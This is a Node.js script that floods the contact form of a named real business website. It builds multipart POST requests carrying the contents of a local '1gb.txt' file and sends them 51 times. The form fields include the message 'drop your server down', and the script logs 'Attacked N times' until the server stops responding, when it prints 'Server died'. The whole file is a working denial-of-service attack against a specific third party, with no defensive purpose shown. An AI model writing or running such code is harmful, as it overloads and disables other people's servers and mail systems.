var querystring = require('querystring');
var request = require('request');
var fs = require("fs");
const crypto = require("crypto");

// var form = {
//     username: 'usr',
//     password: 'pwd',
//     opaque: 'opaque',
//     logintype: '1'
// };

var filename = __dirname + "/1gb.txt";
var file_content = fs.readFileSync(filename).toString();

var files = [file_content];

var fields = {
    "ten": "test",
    "dienthoai": "0772848291",
    "diachi": "test",
    "email": "test@gmail.com",
    "tieude": "Test",
    "noidung": "drop your server down",
    "file": file_content,
    "submit-contact": "Gửi",
    "recaptcha_response_contact": "",
};

var attacked_times = 0;
var id, boundary, delimiter, post_data;


function build_data_files(boundary, fields, files){
    data = '';
    eol = "\r\n";

    delimiter = '-------------' + boundary;
    for (var name in fields) {
        var content = fields[name];
        data += "--" + delimiter + eol
            + 'Content-Disposition: form-data; name="' + name + "\""+eol+eol
            + content + eol;
    }

    files.forEach(function (name, content) {
        data += "--" + delimiter + eol
            + 'Content-Disposition: form-data; name="' + name + '"; filename="' + name + '"' + eol
            //. 'Content-Type: image/png'.eol
            + 'Content-Transfer-Encoding: binary'+eol
            ;

        data += eol;
        data += content + eol;
    })

    data += "--" + delimiter + "--"+eol;


    return data;
}

for (var i = 0; i <= 50; i++) {
    id = crypto.randomBytes(16).toString("hex");
    boundary = id;
    delimiter = '-------------' + boundary;
    post_data = build_data_files(boundary, fields, files);

    // console.log(post_data);
    // return;
    request({
        headers: {
            "Content-Type": "multipart/form-data; boundary=" + delimiter,
            "Content-Length": post_data.length
        },
        uri: 'https://vuongkhangmotor.com/lien-he',
        body: post_data,
        method: 'POST'
    }, function (err, res, body) {
        //it works!
        // console.log(err);
        // console.log(body);
        if (body && body.length != 0 && body.includes("PHPMailer")) {
            attacked_times += 1;
            console.log("\x1b[32m Attacked " + attacked_times + " times");
        } else {
            i = 0;
            console.log("\x1b[31m Server died");
        }
        console.log("\x1b[0m");
    });
}
